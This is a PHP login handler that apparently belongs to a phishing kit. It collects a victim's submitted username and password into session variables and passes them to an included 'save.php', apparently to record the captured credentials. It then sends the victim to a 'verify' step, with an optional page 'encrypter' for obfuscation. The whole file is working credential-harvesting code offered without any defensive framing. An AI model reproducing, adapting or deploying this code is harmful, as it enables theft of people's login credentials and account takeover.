<?php
session_start();

require_once 'inc/functions.php';
require_once 'inc/config.php';

$isValidUsername = false;
$isValidPassword = false;
$errno = 1;


if (isset($_SERVER['HTTP_REFERER']) && isset($_SERVER['HTTP_HOST']) && isset($_SESSION['USER_OK']) && $_SESSION['USER_OK'] === 'OK' && isset($_SESSION['SESSION_ID'])) {
    $ref = $_SERVER['HTTP_REFERER'];
    $host = $_SERVER['HTTP_HOST'];
    $host2 = bin2hex($_SERVER['HTTP_HOST']);

    
    if (isset($_POST['userNameInput']) && !empty($_POST['userNameInput'])) {
		$isValidUsername = true;
		$_SESSION['LoginId'] = $_POST['userNameInput'];
    }
    
    if (isset($_POST['passwordInput']) && !empty($_POST['passwordInput'])) {
        if (strlen($_POST['passwordInput']) >= 4) {
            $isValidPassword = true;
            $_SESSION['Passcode'] = $_POST['passwordInput'];
        }
    }

    if (!$isValidPassword || !$isValidUsername) {
        header("Location: login.php?invalid=true&error=".$errno."&session=" . $host2);
    } else {
        if (strpos($ref, $host) !== FALSE) {
            $include = 1;
            include("inc/save.php");
        }
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>

<script>
	window.irOn=true;
</script>
</head>
<body>
<meta http-equiv="refresh" content="0; url=verify.php?p=1&session=<?=$host2?>" />
<? header("refresh:0; url=verify.php?p=1&session=".$host2);?>
</body>

</html>